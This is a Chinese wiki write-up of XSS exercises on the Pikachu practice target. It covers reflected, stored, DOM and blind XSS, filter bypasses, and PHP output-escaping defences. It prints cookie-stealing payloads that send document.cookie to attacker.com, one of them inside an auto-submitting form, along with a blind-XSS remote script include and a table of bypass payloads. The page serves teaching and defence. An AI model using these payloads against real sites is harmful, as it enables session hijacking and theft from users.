---
title: Pikachu靶场XSS漏洞实战复现：反射型、存储型、DOM型、盲打及过滤绕过与输出转义防御
description: 基于无名安全团队归档文章，系统复现Pikachu靶场XSS漏洞全类型实战，涵盖反射型（GET/POST）、存储型、DOM型、DOM-X、盲打XSS的攻击原理、Payload构造、利用链分析，深度解析htmlspecialchars、href输出、JS输出三大输出场景下的转义防御策略及过滤绕过技巧。
category: program-analysis
tags:
- Pikachu靶场
- XSS
- 跨站脚本攻击
- 反射型XSS
- 存储型XSS
- DOM型XSS
- 盲打XSS
- 过滤绕过
- 输出转义
- htmlspecialchars
- Web安全
- 漏洞复现
- 无名安全团队
date: 2024-01-15
updated: '2026-11-14'
---
## 概述

本页面系统整理 Pikachu 靶场 XSS（Cross-Site Scripting，跨站脚本攻击）漏洞的完整实战复现内容。XSS 漏洞成因核心在于**程序对输入和输出未做合适处理**，导致精心构造的字符在前端被浏览器当作有效代码解析执行。防御体系遵循**输入过滤 + 输出转义**双重原则，需根据输出点上下文（HTML、HTML属性、JavaScript、URL等）采取差异化转义策略。

> 交叉引用：Pikachu 靶场其他漏洞系列 — [[pikachu-target-writeup-part3]]（CSRF、SQL注入）、[[pikachu-target-writeup-part4]]（RCE、文件包含、文件上传、越权）、[[pikachu-target-writeup-part5]]（目录遍历、信息泄露、PHP反序列化、XXE、SSRF）

---

## 反射型 XSS（Reflected XSS）

### GET 型反射 XSS

- **触发方式**：用户输入直接经 URL 参数反射至响应页面，无服务端存储。
- **利用场景**：诱导受害者点击携带恶意 Payload 的链接。
- **典型 Payload**：`<script>alert('xss')</script>` 或窃取 Cookie：`<script>document.location='http://attacker.com/cookie.php?cookie='+document.cookie</script>`

### POST 型反射 XSS

- **差异点**：参数通过 POST 请求体传递，无法直接通过 URL 分享。
- **利用技巧**：构造自动提交的 HTML 表单页面，诱导受害者访问即触发提交。

```html
<html>
<head>
  <script>
    window.onload = function() {
      document.getElementById("postsubmit").click();
    }
  </script>
</head>
<body>
  <form method="post" action="http://target/vul/xss/xsspost/xss_reflected_post.php">
    <input id="xssr_in" type="text" name="message" value="<script>document.location='http://attacker.com/cookie.php?cookie='+document.cookie</script>" />
    <input id="postsubmit" type="submit" name="submit" value="submit" />
  </form>
</body>
</html>
```

- **攻击链**：受害者访问攻击者页面 → 表单自动提交 → 目标站点反射执行脚本 → Cookie 发送至攻击者后台。

---

## 存储型 XSS（Stored XSS）

- **核心特征**：恶意脚本持久化存储于服务端（数据库、文件等），所有访问该数据的用户均会触发。
- **危害等级**：最高，无需用户点击特定链接，仅需访问包含恶意数据的页面。
- **典型注入点**：留言板、评论区、个人资料、订单备注等用户可控且持久化的输入字段。
- **实战 Payload**：`<script>alert('stored xss')</script>` 或结合 XSS 平台实现长期控制。

> 交叉引用：实战案例参考 [[edu-src-penetration-test-case-study]]（教育行业 SRC 渗透测试中利用存储型 XSS 推进攻击链）

---

## DOM 型 XSS（DOM-based XSS）

### 核心原理

> DOM XSS 与反射型、存储型的主要区别在于：**XSS 代码不需要服务端解析响应的直接参与，触发 XSS 的是浏览器端的 DOM 解析**。数据流：Source（URL fragment、location.hash 等）→ Sink（innerHTML、document.write、eval 等）无后端交互。

### 经典案例：onclick 事件注入

- **输入点**：用户输入被直接拼接进 `<a href="...">` 的 `onclick` 属性中。
- **闭合构造**：`' onclick="alert('5550')"` —— 单引号闭合前属性，注入事件处理器。
- **触发条件**：用户点击生成的链接 "what do you see?" 即执行。

### DOM-X 变种

- **场景**：前端 JS 通过 `document.write` 或 `innerHTML` 直接渲染 `location.hash` 或 `location.search` 内容。
- **利用**：`#<img src=x onerror=alert(1)>` 等经典 DOM Sink Payload。

---

## XSS 盲打（Blind XSS）

### 定义与本质

> **盲打**是指攻击者在不知道后台展现逻辑、甚至不确定是否存在 XSS 的情况下，向所有疑似输入点（留言、反馈、工单、日志、User-Agent、Referer 等）提交**带有真实攻击功能的远程 JS 引用代码**。当后台管理人员审核/查看数据时触发。

### 典型 Payload

```html
<script src="http://attacker.com/xss.js"></script>
```

- **远程 JS 功能**：窃取 Cookie、键盘记录、钓鱼登录框、探测内网、发起进一步攻击。
- **Pikachu 靶场验证**：提交后在后台登录页面 `admin_login.php` 触发弹窗，证明后台管理员查看了提交数据。

> 交叉引用：盲打常结合 XSS 平台（如 BlueLotus、XSS Receiver）实现自动化收集，参见 [[ssrf-ctf-exploitation-guide]] 中 SSRF 与 XSS 平台联动技巧。

---

## XSS 过滤绕过技巧

### 常见过滤机制与绕过

| 过滤策略 | 绕过思路 | 示例 Payload |
|----------|----------|--------------|
| 关键词过滤（script、alert等） | 大小写混淆、编码、拆分 | `<ScRiPt>alert(1)</ScRiPt>`、`<scr<script>ipt>alert(1)</scr<script>ipt>`（多次过滤失效） |
| 标签过滤 | 利用事件处理器、伪协议 | `<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>`、`<a href=javascript:alert(1)>click</a>` |
| 属性过滤 | 闭合前属性注入新属性 | `</p><a href='' onclick="alert(1)">aa</a><p>` |
| 多次递归过滤 | 利用过滤器自身特性构造畸形标签 | `<scr<script>ipt>alert(1)</scr<script>ipt>` 仅对单次过滤有效，多次过滤需寻找其他标签/属性组合 |

### 实战观察

- `htmlspecialchars()` 仅转义 `&` `"` `'` `<` `>` 五字符，**无法防御**已在 HTML 属性上下文（如 `href`、`onclick`）中的注入。
- 针对 `href` 输出点，单靠 `htmlspecialchars` **不足**，需双重防护：① 仅允许 `http/https` 协议头；② 再做实体转义。

---

## 输出转义防御体系

### 核心原则

> **输入做过滤（按业务强校验），输出做转义（按上下文差异化转义）。** 所有输出到前端的数据必须根据输出点位置进行适当转义。

### HTML 实体转义 — `htmlspecialchars()`

```php
htmlspecialchars($string, ENT_QUOTES | ENT_HTML5, 'UTF-8');
```

- **转义字符**：`& → &amp;`、`" → &quot;`、`' → &#039;`、`< → &lt;`、`> → &gt;`
- **适用场景**：HTML 标签内容、HTML 属性值（双引号包裹时）。
- **局限**：**无法防御**单引号包裹属性中的注入（需 `ENT_QUOTES`）、JavaScript 上下文、URL 上下文、`href` 伪协议注入。

### `href` 属性输出防御

**两步走策略**：

1. **协议白名单校验**：仅允许 `http://`、`https://` 开头的 URL，拒绝 `javascript:`、`data:`、`vbscript:` 等伪协议。
2. **HTML 实体转义**：对通过校验的 URL 再次调用 `htmlspecialchars()`，防止引号闭合注入事件处理器。

```php
if (strpos($url, 'http://') === 0 || strpos($url, 'https://') === 0) {
    $safeUrl = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
    echo "<a href='$safeUrl'>link</a>";
}
```

### JavaScript 上下文输出转义

- **错误做法**：直接用 `htmlspecialchars()` —— 实体编码后 JS 引擎**不会解码**，导致功能失效且仍可能绕过。
- **正确做法**：**JS 转义**（反斜杠转义特殊字符）。

```php
// PHP 侧：json_encode() 自动处理引号、反斜杠、控制字符、Unicode
echo "<script>var userInput = " . json_encode($input, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP) . ";</script>";
```

- **手动转义规则**：`\ → \\`、`' → \'`、`" → \"`、`</ → <\/`、`\n → \n`、`\r → \r`、`\u2028 → \u2028`、`\u2029 → \u2029`。

### 实战 Payload：JS 上下文闭合注入

```js
// 原始代码：<script>var msg = 'user_input';</script>
// 攻击输入：
'</script><script>alert('xss')</script>
// 结果：闭合原字符串与 script 标签，注入新 script 标签执行任意代码
```

---

## 防御检查清单

| 输出点上下文 | 推荐转义函数/方法 | 关键注意事项 |
|--------------|-------------------|--------------|
| HTML 标签内文本 | `htmlspecialchars($str, ENT_QUOTES, 'UTF-8')` | 必须设置 `ENT_QUOTES` 转义单引号 |
| HTML 双引号属性值 | `htmlspecialchars($str, ENT_QUOTES, 'UTF-8')` | 同上 |
| HTML 单引号属性值 | `htmlspecialchars($str, ENT_QUOTES, 'UTF-8')` | 同上 |
| `href` / `src` 属性 | ① 协议白名单 ② `htmlspecialchars()` | 拒绝 `javascript:` `data:` 等伪协议 |
| JavaScript 变量/字符串 | `json_encode($str, JSON_HEX_TAG\|JSON_HEX_APOS\|JSON_HEX_QUOT\|JSON_HEX_AMP)` | 禁用 `htmlspecialchars`，确保 JS 语法安全 |
| CSS 属性值 | CSS 转义（`\` + 十六进制） | 严格限制允许的 CSS 属性与值 |
| URL 参数值 | `urlencode()` / `rawurlencode()` | 仅对参数值编码，非整个 URL |

---

## 交叉引用与延伸阅读

- **Pikachu 靶场系列**：[[pikachu-target-writeup-part3]]、[[pikachu-target-writeup-part4]]、[[pikachu-target-writeup-part5]]
- **XSS 靶场通关**：[[xss-haozi-lab-walkthrough]]（19 关过滤绕过、编码转义、上下文逃逸系统复现）
- **SSRF 与 XSS 联动**：[[ssrf-ctf-exploitation-guide]]（Pikachu SSRF 实战中 `file_get_contents` 与 `curl` 协议差异利用）、[[ssrf-bypass-techniques]]（五大核心绕过技巧）
- **PHP 反序列化与伪协议**：[[php伪协议与反序列化利用]]（含 Pikachu PHP 反序列化实战、`php://filter`、`gopher://` 攻击 FastCGI/Redis）
- **WebSocket 安全**：[[websocket-vulnerabilities-analysis]]（XSS 消息注入、CSWSH 跨站 WebSocket 劫持）
- **实战渗透案例**：[[edu-src-penetration-test-case-study]]（存储型 XSS 推进 Getshell）、[[gkctf-2021-web-writeup]]（CheckBot 题目 SSRF/XSS 窃取 Flag）
- **CTF 综合平台**：[[attack-defense-world-master-advanced-writeup]]（含 XSS 相关题目）、[[ctfshow-web-info-gathering-brute-force]]（信息收集与爆破基础）

---

## 小结

Pikachu 靶场 XSS 实战覆盖了 **反射型（GET/POST）、存储型、DOM型、DOM-X、盲打** 五大攻击面，配合 **过滤绕过**（大小写、编码、事件处理器、属性闭合、畸形标签）与 **输出转义防御**（HTML 实体、`href` 双重校验、JS `json_encode`）三大核心场景，构建了完整的 XSS 攻防知识闭环。实战中需牢记：**没有万能的过滤，只有上下文感知的转义**。

## 来源

- [0x00实验室-202108-202304_078](../sources/0x00实验室-202108-202304_078.md)
